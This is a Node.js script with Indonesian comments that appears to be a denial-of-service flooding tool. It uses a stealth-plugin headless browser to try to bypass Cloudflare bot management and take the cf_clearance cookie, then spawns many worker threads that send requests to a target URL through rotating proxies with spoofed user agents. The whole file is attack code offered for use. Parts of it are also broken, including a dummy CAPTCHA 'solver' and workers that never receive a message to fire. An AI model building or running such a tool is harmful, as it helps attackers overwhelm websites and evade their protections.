const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const { randomBytes } = require('crypto');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const fs = require('fs');

// Parsing input dari command line
const [targetUrl, maxConcurrentRequests] = process.argv.slice(2);
if (!targetUrl || isNaN(maxConcurrentRequests)) {
    console.log("Usage: node script.js <target_url> <max_concurrent_requests>");
    process.exit(1);
}

// Baca proxy dari file proxy.txt
let PROXY_LIST = [];
try {
    PROXY_LIST = fs.readFileSync('proxy.txt', 'utf-8').split('\n').map(p => p.trim()).filter(p => p);
    if (PROXY_LIST.length === 0) {
        console.error("[-] proxy.txt is empty or invalid.");
        process.exit(1);
    }
} catch (err) {
    console.error(`[-] Error reading proxy.txt: ${err.message}`);
    process.exit(1);
}

// Konfigurasi
const MAX_CONCURRENT_REQUESTS = parseInt(maxConcurrentRequests, 10);
const TARGET_URL = targetUrl;

// Tambahkan plugin anti-detection
puppeteer.use(StealthPlugin());

// Fungsi untuk menghasilkan User-Agent acak
function generateUserAgent() {
    const browsers = ["Chrome", "Firefox", "Safari", "Edge"];
    const versions = ["120.0.0", "119.0.1", "118.0.2", "117.0.3"];
    return `${browsers[Math.floor(Math.random() * browsers.length)]} ${versions[Math.floor(Math.random() * versions.length)]}`;
}

// Fungsi untuk bypass CAPTCHA menggunakan Puppeteer
async function bypassCaptcha() {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.setUserAgent(generateUserAgent());

    try {
        await page.goto(TARGET_URL, { waitUntil: 'networkidle2' });
        await page.waitForSelector('iframe[title="Cloudflare Bot Management"]', { timeout: 10000 });

        // Simulasi penyelesaian CAPTCHA (ganti dengan solver real jika diperlukan)
        await page.evaluate(() => {
            // Dummy CAPTCHA solution (replace with real solver API)
            document.querySelector('input[type="text"]').value = 'CAPTCHA_SOLVED';
            document.querySelector('form').submit();
        });

        // Ekstrak cookie cf_clearance
        const cookies = await page.cookies();
        const cfClearance = cookies.find(c => c.name === 'cf_clearance')?.value;
        await browser.close();
        return cfClearance;
    } catch (error) {
        await browser.close();
        throw new Error("Gagal bypass CAPTCHA");
    }
}

// Fungsi worker untuk mengirim permintaan
if (isMainThread) {
    async function main() {
        try {
            const cfClearance = await bypassCaptcha();
            if (!cfClearance) throw new Error("Tidak dapat mendapatkan cf_clearance");

            const workers = [];
            for (let i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {
                const proxy = PROXY_LIST[Math.floor(Math.random() * PROXY_LIST.length)];
                const workerCode = `
                    const axios = require('axios');
                    const { httpsProxyAgent } = require('https-proxy-agent');
                    const { parentPort } = require('worker_threads');
                    
                    const [cfClearance, proxy, targetUrl] = workerData;
                    parentPort.on('message', async () => {
                        const headers = {
                            "User-Agent": "Mozilla/${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 100)}",
                            "Accept-Language": "en-US,en;q=0.9",
                            "Cookie": \`cf_clearance=\${cfClearance}\`
                        };

                        try {
                            const response = await axios.get(targetUrl, {
                                headers,
                                httpsAgent: new httpsProxyAgent(proxy),
                                timeout: 5000
                            });
                            parentPort.postMessage(\`[+] Request sent. Status: \${response.status}\`);
                        } catch (error) {
                            parentPort.postMessage(\`[-] Error: \${error.message}\`);
                        }
                    });
                `;

                const worker = new Worker(workerCode, {
                    eval: true,
                    workerData: [cfClearance, proxy, TARGET_URL]
                });

                workers.push(worker);

                worker.on('message', (msg) => {
                    console.log(msg);
                });

                worker.on('error', (err) => {
                    console.error(`Worker error: ${err.message}`);
                });

                worker.on('exit', (code) => {
                    if (code !== 0) {
                        console.error(`Worker exited with code ${code}`);
                    }
                });
            }
        } catch (error) {
            console.error(`[-] Error utama: ${error.message}`);
        }
    }

    main();
} else {
    // Worker thread code (evaluated inline)
    const axios = require('axios');
    const { httpsProxyAgent } = require('https-proxy-agent');
    const { parentPort, workerData } = require('worker_threads');
    
    const [cfClearance, proxy, targetUrl] = workerData;
    parentPort.on('message', async () => {
        const headers = {
            "User-Agent": `Mozilla/${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 100)}`,
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": `cf_clearance=${cfClearance}`
        };

        try {
            const response = await axios.get(targetUrl, {
                headers,
                httpsAgent: new httpsProxyAgent(proxy),
                timeout: 5000
            });
            parentPort.postMessage(`[+] Request sent. Status: ${response.status}`);
        } catch (error) {
            parentPort.postMessage(`[-] Error: ${error.message}`);
        }
    });
}
